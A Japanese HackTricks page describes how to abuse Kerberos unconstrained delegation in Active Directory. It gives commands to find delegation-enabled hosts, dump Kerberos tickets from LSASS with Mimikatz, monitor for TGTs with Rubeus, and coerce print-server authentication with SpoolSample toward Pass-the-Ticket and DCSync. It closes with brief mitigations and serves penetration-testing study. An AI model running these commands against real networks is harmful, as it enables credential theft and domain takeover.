# 制約のない委任

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFT](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

## 制約のない委任

これは、ドメイン管理者がドメイン内の任意の**コンピュータ**に設定できる機能です。その後、**ユーザーがコンピュータにログイン**するたびに、そのユーザーの**TGTのコピー**がDCが提供するTGSに**送信され、LSASSのメモリに保存**されます。したがって、そのマシンで管理者特権を持っている場合、チケットをダンプして**ユーザーをなりすます**ことができます。

したがって、ドメイン管理者が「制約のない委任」機能が有効になっているコンピュータにログインし、そのマシンでローカル管理者特権を持っている場合、チケットをダンプしてどこでもドメイン管理者になりすますことができます（ドメイン昇格）。

この属性を持つ**コンピュータオブジェクトを見つける**には、[userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx)属性が[ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx)を含んでいるかどうかを確認します。これは、powerviewが行う方法です。LDAPフィルター '（userAccountControl:1.2.840.113556.1.4.803:=524288）'を使用してこれを行うことができます。

<pre class="language-bash"><code class="lang-bash"># 制約のないコンピュータのリスト
## Powerview
Get-NetComputer -Unconstrained #DCは常に表示されますが、昇格には役立ちません
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Mimikatzでチケットをエクスポート
</strong>privilege::debug
sekurlsa::tickets /export #推奨される方法
kerberos::list /export #別の方法

# ログインを監視して新しいチケットをエクスポート
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #新しいTGTを10秒ごとにチェック</code></pre>

**Mimikatz**または**Rubeus**を使用して管理者（または被害者ユーザー）のチケットをメモリにロードし、[**Pass the Ticket**](pass-the-ticket.md)を行います。\
詳細情報: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.teamのUnconstrained delegationに関する詳細情報**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **強制認証**

攻撃者が「制約のない委任」に許可されたコンピュータを**侵害**できる場合、**プリントサーバー**を**トリック**して**自動的にログイン**させ、サーバーのメモリにTGTを保存できます。\
その後、攻撃者は、ユーザープリントサーバーコンピューターアカウントをなりすまして**Pass the Ticket攻撃**を実行できます。

プリントサーバーを任意のマシンにログインさせるには、[**SpoolSample**](https://github.com/leechristensen/SpoolSample)を使用できます。
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
もしTGTがドメインコントローラーからである場合、[**DCSync攻撃**](acl-persistence-abuse/#dcsync)を実行し、DCからすべてのハッシュを取得することができます。\
[**この攻撃に関する詳細はired.teamを参照してください。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**他に認証を強制する方法は以下の通りです:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### 緩和策

* 特定のサービスに対するDA/Adminログインを制限する
* 特権アカウントに対して「アカウントは機密であり委任できません」を設定する。
